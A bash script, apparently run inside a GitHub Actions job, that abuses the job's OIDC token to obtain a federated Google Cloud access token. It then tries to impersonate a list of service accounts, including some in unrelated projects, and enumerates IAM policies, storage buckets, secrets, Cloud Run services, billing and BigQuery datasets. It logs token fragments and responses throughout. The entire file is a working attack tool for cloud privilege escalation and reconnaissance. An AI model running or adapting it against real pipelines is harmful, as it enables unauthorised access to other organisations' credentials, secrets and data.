#!/bin/bash
set -u
PROVIDER="projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
AUD="//iam.googleapis.com/${PROVIDER}"
AUD_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_ENC}"
OIDC=$(curl -s -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
echo "OIDC_LEN=${#OIDC}"
STS=$(curl -s -X POST https://sts.googleapis.com/v1/token \
  --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  --data-urlencode "audience=${AUD}" \
  --data-urlencode "subject_token=${OIDC}" \
  --data-urlencode "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  --data-urlencode "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
  --data-urlencode "scope=https://www.googleapis.com/auth/cloud-platform")
echo "STS_HEAD=$(echo "$STS" | head -c 300)"
TOKEN=$(echo "$STS" | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin); print(d.get('access_token',''))
except Exception:
  print('')")
echo "FED_TOKEN_LEN=${#TOKEN}"
if [ -z "$TOKEN" ]; then echo "STS_FAILED"; exit 0; fi
echo "=== STEP2_STS_DONE ==="

gen() {
  local label="$1"; local path="$2"
  local out
  out=$(curl -s -w '\nHTTP=%{http_code}' -X POST -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
    "https://iamcredentials.googleapis.com/v1/${path}:generateAccessToken")
  local code=$(printf '%s' "$out" | tail -1 | sed 's/HTTP=//')
  local body=$(printf '%s' "$out" | head -c 180)
  echo "GEN|${label}|${code}|$(printf '%s' "$body" | tr '\n' ' ')"
}

SA1="serviceAccounts/github-actions@zuplo-marketing.iam.gserviceaccount.com"
SA2="serviceAccounts/196494084534-compute@developer.gserviceaccount.com"
SA3="serviceAccounts/rate-my-open-api@zuplo-marketing.iam.gserviceaccount.com"
SA4="serviceAccounts/zuplo-marketing@appspot.gserviceaccount.com"
SA5="serviceAccounts/github-actions-wi@zuplo-marketing.iam.gserviceaccount.com"
SA6="serviceAccounts/deploy@zuplo-marketing.iam.gserviceaccount.com"
SA7="serviceAccounts/ci@zuplo-marketing.iam.gserviceaccount.com"
SA8="serviceAccounts/github@zuplo-marketing.iam.gserviceaccount.com"
SA9="serviceAccounts/terraform@zuplo-marketing.iam.gserviceaccount.com"
SA10="serviceAccounts/contrib-registry-writer@tmrow-152415.iam.gserviceaccount.com"
SA11="serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com"

gen "wild_github-actions" "projects/-/${SA1}"
gen "proj_github-actions" "projects/196494084534/${SA1}"
gen "wild_default_compute" "projects/-/${SA2}"
gen "wild_rate-my-open-api" "projects/-/${SA3}"
gen "wild_appengine" "projects/-/${SA4}"
gen "wild_github-actions-wi" "projects/-/${SA5}"
gen "wild_deploy" "projects/-/${SA6}"
gen "wild_ci" "projects/-/${SA7}"
gen "wild_github" "projects/-/${SA8}"
gen "wild_terraform" "projects/-/${SA9}"
gen "cross_tmrow_contrib" "projects/-/${SA10}"
gen "cross_aryeelab_build" "projects/-/${SA11}"

# generateIdToken on the chain's claimed SA
out=$(curl -s -w '\nHTTP=%{http_code}' -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" -d '{"audience":"https://example.com","includeEmail":true}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/${SA1}:generateIdToken")
echo "GENID|$(printf '%s' "$out" | tr '\n' ' ' | head -c 200)"

get() {
  local label="$1"; local url="$2"
  local out
  out=$(curl -s -m 25 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $TOKEN" "$url")
  local code=$(printf '%s' "$out" | tail -1 | sed 's/HTTP=//')
  local body=$(printf '%s' "$out" | head -c 220)
  echo "GET|${label}|${code}|$(printf '%s' "$body" | tr '\n' ' ')"
}

get "crm_project_get" "https://cloudresourcemanager.googleapis.com/v1/projects/196494084534"
get "crm_policy" "https://cloudresourcemanager.googleapis.com/v1/projects/196494084534:getIamPolicy?options.requestedPolicyVersion=3"
get "wi_pools_list" "https://iam.googleapis.com/v1/projects/196494084534/locations/global/workloadIdentityPools"
get "wi_provider_get" "https://iam.googleapis.com/v1/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
get "sa_list" "https://iam.googleapis.com/v1/projects/196494084534/serviceAccounts"
get "buckets_list" "https://storage.googleapis.com/storage/v1/b?project=196494084534"
get "bucket_rate_my_open_api_prod" "https://storage.googleapis.com/storage/v1/b/rate-my-open-api-prod/o?maxResults=20"
get "bucket_rate_my_open_api" "https://storage.googleapis.com/storage/v1/b/rate-my-open-api/o?maxResults=20"
get "bucket_iam_prod" "https://storage.googleapis.com/storage/v1/b/rate-my-open-api-prod/iam"
get "run_service" "https://run.googleapis.com/v2/projects/196494084534/locations/us-east1/services/rate-my-open-api"
get "run_services_all" "https://run.googleapis.com/v2/projects/196494084534/locations/-/services"
get "secrets_list" "https://secretmanager.googleapis.com/v1/projects/196494084534/secrets"
get "aiplatform_models" "https://us-central1-aiplatform.googleapis.com/v1/projects/196494084534/locations/us-central1/models"
get "billing" "https://cloudbilling.googleapis.com/v1/projects/196494084534/billingInfo"
get "bigquery_control" "https://bigquery.googleapis.com/bigquery/v2/projects/196494084534/datasets"
get "storage_iam_test" "https://storage.googleapis.com/storage/v1/b/zuplo-marketing_cloudbuild/o?maxResults=10"
echo "=== DONE ==="
